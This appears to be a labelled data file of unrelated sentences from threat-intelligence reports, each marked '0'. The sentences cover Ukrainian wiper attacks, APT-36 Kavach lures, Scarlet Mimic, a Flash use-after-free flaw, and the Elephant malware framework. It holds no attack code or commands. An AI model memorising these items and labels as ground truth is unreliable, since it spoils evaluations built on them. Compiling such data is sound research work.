0	The application named   which translates from Uyghur to Guerrilla Warfare (md5: b5fb0fb9488e1b8aa032d7788282005f) contains the PDF version of the short version of the military course by Yusuf al-Ayeri, the now deceased first leader ofAl-Qaeda in Saudi Arabia, which outlines the tactical methods of guerrilla warfare.
0	Over the years, Scarlet Mimic strongly continues its espionage operations against the Uyghur community using Android malware.
0	Figure 1.Example of defaced Ukrainian government website.
0	Despite the ransom request, the data will not be recoverable since all efforts made by WhisperKill are looking to destroy data, not encrypt it.
0	HermeticWiper
0	A month after, on February 23rd 2022, ESET Research reported a new Wiper being used against hundreds of Ukrainian systems.
0	According to a Reuters article, the certificate could have also been obtained by impersonating the company and requesting a certificate from scratch.
0	Figure 3.Hermetica Digital Ltd certificate.
0	IsaacWiper
0	A day after the initial destructive attack with HermeticWiper, on February 24th, 2022, a new wiper was used against the Ukrainian government, as reported by ESET, without any significant similarities to the HermaticWiper used the day before.
0	Figure 4.IsaacWiper strings.
0	When comparing IsaacWiper to WhisperKill, the attackers priorities become clear.
0	It was used in 2018, targeting vulnerabilities in several common router brands: Linksys, MikroTik, NETGEAR, and TP-Link.
0	This new wiper showed similarities to previously seen botnets targeting modems using VPNFilter.
0	This wiper was particularly aimed at modems, probably to disrupt Internet access from Ukraine.
0	AcidRain
0	As we have seen in the examples above, the main objective of the attackers behind wipers is to destroy all possible data and render systems unbootable (if possible), potentially requiring a full system restore if backups arent available.
0	For that reason, it is not effective to employ detection of wiper malware, asonce they are in the system as it is already too late.
0	The best approach against wipers is to prevent attacks by keeping systems up to date and by increasing cybersecurity awareness.
0	In addition, consequences can be ameliorated by having periodic backup copies of key infrastructure available.
0	The following technical indicators are associated with the reported intelligence.
0	A list of indicators is also available in the following OTX Pulses:
0	On February 1st, Adobe published bulletin [APSA18-01](https://helpx.adobe.com/security/products/flash-player/apsa18-01.html) for CVE-2018-4878 describing a use-after-free (UAF) vulnerability affecting Flash version 28.0.0.137 and earlier.
0	As of February 6th, Adobe has patched the issue in version 28.0.0.161, see: [APSB18-03](https://helpx.adobe.com/security/products/flash-player/apsb18-03.html).
0	This post provides an overview of the vulnerability, a walk-through of the exploit seen in the wild, and covers several detection mechanisms.
0	Upon closer inspection and monitoring this website over a period of time, we uncovered the following new TTPs.
0	Updating download links
0	This app store is used as a gateway to redirect the users to attacker-registered domains hosting the backdoored versions of Kavach application.
0	To understand this better, we took snapshot of this website at different points of time in 2022
0	A similar persistence mechanism was used by another tool in SideCopy APT's arsenal in 2021.
0	DUSSEN field contains a hex-encoded version of the string - "india".
0	The fields - DBTABLES, DBTABLES_INDEXES and SYNC_RULES_CONFIG all correspond to the structure and configuration of the tables in the local SQLite database.
0	Figure 10: Contents of a database from an infected VM
0	These drawing file extensions correspond to "AutoCAD" or computer-aided design vector files.
0	Below are the main steps in network communication of LimePad.
0	Below is a brief description of the different stages of network requests.
0	As we indicated earlier, we are still investigating this case.
0	We obtained the list of all the infected machines registered with the attackers server.
0	Figure 12 below shows a preview of the latest information.
0	On execution, the binary performs following operations:
0	Performs the time zone check and executes further only if the time zone matches Indian Standard Time (IST).
0	The installer is extracted from the resource section of the binary.
0	Stage-2: PyInstaller compiled binary
0	The Stage-2 payload is a Python script compiled to an executable using PyInstaller.
0	For analysis we extracted the Python script which we have included in the Appendix section.
0	The script on execution does following major operations:
0	Taking snapshots
0	Creating persistence
0	Exfiltrating user and system information
0	One of the key targets of APT-36 is the Indian government and it targets the government users with various Kavach related themes including credential harvesting attacks.
0	Figure 14: Open directory on the server hosting the Kavach phishing page
0	The image file - kavach.jpg in the above open directory stood out based on the file creation date.
0	We pivoted on this image files hash, and observed that the same image was also referenced from kavach-app[.]com (a domain which we previously attributed to APT-36 group).
0	Zscaler detection status
0	This report was intended to shed light on one of several C&C frameworks that criminals are using.
0	DeimosC2 is one of the alternative tools that SOC teams will likely see being used against their networks for post-compromise activities.
0	A recently developed malware framework called Elephant is being delivered in targeted spear phishing campaigns using spoofed Ukrainian governmental email addresses.
0	The four malware components delivered are used for stealing credentials, documents, and to provide remote access to the infected machine.
0	Two of these components were first reported on by the Computer Emergency Response Team for Ukraine (CERT-UA) in March 2022.
0	They named the two components GraphSteel and GrimPlant.
0	When investigating these events, we have identified that Elephant has also been delivered via phishing emails from spoofed Ukrainian email addresses.
0	Elephant is a malware framework written in Go.
0	The activity has been attributed to UAC-0056 (TA471, SaintBear, UNC2589) by CERT-UA.
